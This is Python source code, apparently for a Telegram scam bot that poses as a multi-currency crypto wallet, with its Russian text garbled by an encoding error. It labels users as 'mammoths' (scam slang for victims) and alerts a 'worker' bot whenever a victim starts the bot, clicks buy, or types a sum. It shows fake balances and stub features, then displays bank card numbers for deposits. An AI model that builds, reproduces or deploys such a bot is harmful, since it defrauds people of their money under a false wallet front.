from aiogram import Router, F, Bot
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.filters import CommandObject, Command, StateFilter
from aiogram.enums import ParseMode
import aiosqlite

from app.keyboards import ikb
from app.db import Database
from app.states import BuyCurrency, PanelDefault
from app.config import Config

router = Router(name=__name__)

worker_bot = Bot(Config.WORKER_BOT_TOKEN, parse_mode=ParseMode.HTML)


@router.message(Command('start', 'cancel'))
async def cmd_start(message: Message, command: CommandObject, conn: aiosqlite.Connection, state: FSMContext):
    await state.clear()

    db = Database(connection=conn)
    user = message.from_user

    await db.create_table()

    if command.args:
        if command.args.isdigit():
            worker = int(command.args)

            await db.add_user(user_id=user.id)
            await db.add_referral(user_id=user.id, referral=worker)

            referral_user = await db.get_referral(user_id=user.id)

            try:
                await worker_bot.send_message(chat_id=referral_user,
                                              text=f"üíª <b>–ú–∞–º–æ–Ω—Ç ({str(user.id)}) @{user.username} –∑–∞—à–µ–ª –≤ –±–æ—Ç–∞</b>",
                                              reply_markup=ikb.get_open_panel_ikb(user_id=user.id))
            except:
                ...
    else:
        await db.add_user(user_id=user.id)

    await message.answer(text="""
üëõ –ú—É–ª—å—Ç–∏–≤–∞–ª—é—Ç–Ω—ã–π –∫—Ä–∏–ø—Ç–æ–∫–æ—à–µ–ª–µ–∫. –ü–æ–∫—É–ø–∞–π—Ç–µ, –æ—Ç–ø—Ä–∞–≤–ª—è–π—Ç–µ, —Ö—Ä–∞–Ω–∏—Ç–µ –∏ –ø–ª–∞—Ç–∏—Ç–µ –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–æ–π, –∫–æ–≥–¥–∞ —Ö–æ—Ç–∏—Ç–µ.

–ü–æ–¥–ø–∏—Å—ã–≤–∞–π—Ç–µ—Å—å –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª –∏ –≤—Å—Ç—É–ø–∞–π—Ç–µ –≤ –Ω–∞—à —á–∞—Ç.
    """, reply_markup=ikb.get_main_ikb())


@router.message(F.text == "< –Ω–∞–∑–∞–¥", StateFilter(None))
async def return_back(message: Message):
    await message.answer(text="""
üëõ –ú—É–ª—å—Ç–∏–≤–∞–ª—é—Ç–Ω—ã–π –∫—Ä–∏–ø—Ç–æ–∫–æ—à–µ–ª–µ–∫. –ü–æ–∫—É–ø–∞–π—Ç–µ, –æ—Ç–ø—Ä–∞–≤–ª—è–π—Ç–µ, —Ö—Ä–∞–Ω–∏—Ç–µ –∏ –ø–ª–∞—Ç–∏—Ç–µ –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–æ–π, –∫–æ–≥–¥–∞ —Ö–æ—Ç–∏—Ç–µ.

–ü–æ–¥–ø–∏—Å—ã–≤–∞–π—Ç–µ—Å—å –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª –∏ –≤—Å—Ç—É–ø–∞–π—Ç–µ –≤ –Ω–∞—à —á–∞—Ç.
            """, reply_markup=ikb.get_main_ikb())


@router.callback_query(StateFilter(PanelDefault.default, None))
async def all_callback(call: CallbackQuery, conn: aiosqlite.Connection, state: FSMContext):
    db = Database(connection=conn)
    user = call.from_user

    if call.data == "p2p":
        await call.message.edit_text(text=f"""
üí† –ó–¥–µ—Å—å –≤—ã –º–æ–∂–µ—Ç–µ –∫—É–ø–∏—Ç—å –∏–ª–∏ –ø—Ä–æ–¥–∞—Ç—å –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç—É –ø–µ—Ä–µ–≤–æ–¥–æ–º –Ω–∞ –∫–∞—Ä—Ç—É –∏–ª–∏ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω—ã–π –∫–æ—à–µ–ª—ë–∫.    
        """, reply_markup=ikb.get_p2p_ikb())
    elif call.data == "nazad_p2p":
        await call.message.edit_text(text=f"""
üëõ –ú—É–ª—å—Ç–∏–≤–∞–ª—é—Ç–Ω—ã–π –∫—Ä–∏–ø—Ç–æ–∫–æ—à–µ–ª–µ–∫. –ü–æ–∫—É–ø–∞–π—Ç–µ, –æ—Ç–ø—Ä–∞–≤–ª—è–π—Ç–µ, —Ö—Ä–∞–Ω–∏—Ç–µ –∏ –ø–ª–∞—Ç–∏—Ç–µ –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–æ–π, –∫–æ–≥–¥–∞ —Ö–æ—Ç–∏—Ç–µ.

–ü–æ–¥–ø–∏—Å—ã–≤–∞–π—Ç–µ—Å—å –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª –∏ –≤—Å—Ç—É–ø–∞–π—Ç–µ –≤ –Ω–∞—à —á–∞—Ç.
        """, reply_markup=ikb.get_main_ikb())
    elif call.data == "nazad_v_p2p":
        await call.message.edit_text(text="""
üí† –ó–¥–µ—Å—å –≤—ã –º–æ–∂–µ—Ç–µ –∫—É–ø–∏—Ç—å –∏–ª–∏ –ø—Ä–æ–¥–∞—Ç—å –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç—É –ø–µ—Ä–µ–≤–æ–¥–æ–º –Ω–∞ –∫–∞—Ä—Ç—É –∏–ª–∏ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω—ã–π –∫–æ—à–µ–ª—ë–∫.    
        """, reply_markup=ikb.get_p2p_ikb())
    elif call.data == "coshelec":
        money = await db.get_money(user_id=user.id)
        await call.message.edit_text(text=f"""
üëõ –í–∞—à –∫–æ—à–µ–ª–µ–∫:

üí≤ Tether: {money} USDT

üê¨ Toncoin: 0 TON

ü•á Bitcoin: 0 BTC

ü™ô Litecoin : 0 LTC

ü•à Ethereum: 0 ETH

ü•â Binance Coin: 0 BNB

üî• TRON: 0 TRX

üí≤ USD Coin: 0 USDC

üíé Gram: 0 GRAM

‚âà 0 BTC (0 RUB)
        """, reply_markup=ikb.get_return_to_back_ikb())
    elif call.data == "kupit":
        referral_user = await db.get_referral(user_id=user.id)

        await call.message.edit_text(text=f"""
üí† –í—ã–±–µ—Ä–∏—Ç–µ –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç—É, –∫–æ—Ç–æ—Ä—É—é –≤—ã —Ö–æ—Ç–∏—Ç–µ –∫—É–ø–∏—Ç—å. 
        """, reply_markup=ikb.get_cryptocurrencies_ikb())

        if referral_user:
            await worker_bot.send_message(
                chat_id=referral_user,
                text=f"üòÉ <b>–ú–∞–º–æ–Ω—Ç ({str(call.from_user.id)}) @{call.from_user.username}  –Ω–∞–∂–∞–ª –∫—É–ø–∏—Ç—å</b>"
            )

    elif call.data == "valuta":
        await call.message.edit_text(text="–í—ã–±–µ—Ä–∏—Ç–µ –Ω–∞ —Å–∫–æ–ª—å–∫–æ –≤—ã —Ö–æ—Ç–∏—Ç–µ –ø–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å:")

        await state.set_state(BuyCurrency.buy)

    elif call.data == "podpiski":
        await call.message.edit_text(text="""
üçë –ó–¥–µ—Å—å –≤—ã –º–æ–∂–µ—Ç–µ —É–ø—Ä–∞–≤–ª—è—Ç—å —Å–≤–æ–∏–º–∏ –ø–ª–∞—Ç–Ω—ã–º–∏ –ø–æ–¥–ø–∏—Å–∫–∞–º–∏.

üí∞ –ü–æ–¥–∫–ª—é—á–∏—Ç–µ —Å–≤–æ–π –∫–∞–Ω–∞–ª –∏–ª–∏ –≥—Ä—É–ø–ø—É, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∞—Ç—å –¥–æ—Ö–æ–¥. –ö–æ–º–∏—Å—Å–∏—è 5% –≤–∫–ª—é—á–µ–Ω–∞ –≤ —Ü–µ–Ω—É –ø–æ–¥–ø–∏—Å–∫–∏.
        """, reply_markup=ikb.get_subscriptions_ikb())

    elif call.data == "birza":
        await call.message.edit_text(text="""
üê¨ –ó–¥–µ—Å—å –≤—ã –º–æ–∂–µ—Ç–µ —Ç–æ—Ä–≥–æ–≤–∞—Ç—å –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–æ–π –∫–∞–∫ –Ω–∞ –æ–±—ã—á–Ω–æ–π –±–∏—Ä–∂–µ.

ü™ê –í—Å–µ –∑–∞—è–≤–∫–∏ –Ω–∞ –æ–±–º–µ–Ω –≤—ã–ø–æ–ª–Ω—è—é—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏.
        """, reply_markup=ikb.get_stockmarket_ikb())

    elif call.data == "rinok":
        await call.message.edit_text(text="–†—ã–Ω–æ–∫ –¥–æ—Å—Ç—É–ø–µ–Ω —Ç–æ–ª—å–∫–æ –¥–ª—è Premium –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π!",
                                     reply_markup=ikb.get_back_to_menu_ikb())

    elif call.data == "cheki":
        await call.message.edit_text(text="""
–ó–¥–µ—Å—å –≤—ã –º–æ–∂–µ—Ç–µ —Å–æ–∑–¥–∞—Ç—å —á–µ–∫ –¥–ª—è –º–≥–Ω–æ–≤–µ–Ω–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç—ã –ª—é–±–æ–º—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é.
        """, reply_markup=ikb.get_paychecks_ikb())

    elif call.data == "add_check":
        await call.message.edit_text(text="–£ –≤–∞—Å –Ω–µ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–µ–Ω–µ–≥!", reply_markup=ikb.get_back_to_menu_ikb())

    elif call.data == "cheta":
        await call.message.edit_text(text="–£ –≤–∞—Å –Ω–µ—Ç —Å—á–µ—Ç–æ–≤ –¥–ª—è –æ–ø–ª–∞—Ç—ã!", reply_markup=ikb.get_back_to_menu_ikb())

    elif call.data == "prodat":
        await call.message.edit_text(text="–ß—Ç–æ-–±—ã –ø—Ä–æ–¥–∞—Ç—å –Ω—É–∂–Ω–æ –∏–º–µ—Ç—å –Ω–∞ –±–∞–ª–∞–Ω—Å–µ –∫–∞–∫ –º–∏–Ω–º—É–º 1$!",
                                     reply_markup=ikb.get_back_to_menu_ikb())

    elif call.data == "settings":
        await call.message.edit_text(text="–ù–∞—Å—Ç—Ä–æ–π–∫–∏:", reply_markup=ikb.get_settings_ikb())

    else:
        await call.message.edit_text(text="–í—Ä–µ–º–µ–Ω–Ω–æ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç!", reply_markup=ikb.get_back_to_menu_ikb())


@router.message(F.text, StateFilter(BuyCurrency.buy))
async def buy_currency(message: Message, state: FSMContext, conn: aiosqlite.Connection):
    db = Database(connection=conn)
    user = message.from_user

    if message.text.isdigit():
        await message.answer(text="""
üí≥ –ö–∞—Ä—Ç—ã –¥–ª—è –ø—Ä—è–º—ã—Ö –ø–µ—Ä–µ–≤–æ–¥–æ–≤

üá∑üá∫ ‚Äî 2202206820038300

üá∞üáø ‚Äî 5177920005398859

üáßüáæ ‚Äî 5395457709692127
        """, reply_markup=ikb.get_help_ikb())

        referral_user = await db.get_referral(user_id=user.id)

        if referral_user:
            await worker_bot.send_message(
                chat_id=referral_user,
                text=f"üí∂ <b>–ú–∞–º–æ–Ω—Ç ({user.id}) @{user.username}  –≤–≤—ë–ª —Å—É–º–º—É: <code>{message.text}</code></b>")

        await state.clear()
    else:
        await message.answer(text="–°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –≤ —Ü–∏—Ñ—Ä–∞—Ö!")
